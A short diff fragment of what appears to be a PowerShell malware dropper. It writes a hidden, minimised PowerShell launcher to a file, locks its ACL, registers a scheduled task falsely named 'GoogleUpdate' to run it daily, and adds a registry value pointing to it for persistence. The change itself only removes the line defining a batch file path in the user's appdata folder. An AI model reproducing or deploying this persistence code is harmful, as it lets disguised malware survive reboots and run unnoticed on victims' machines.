@@ -43,7 +43,5 @@ $content = "cmd /c start /min powershell start-process powershell {[string]`$awd
 sc $paFile $content
 Set_bootACL($paFile)
 
-$paFile        = $env:appdata + '\cat.bat'
 schtasks /create /tn "GoogleUpdate" /tr $paFile /st 15:30
-
 New-ItemProperty -Path $RegistryPath -Name $Name -Value $paFile -Force
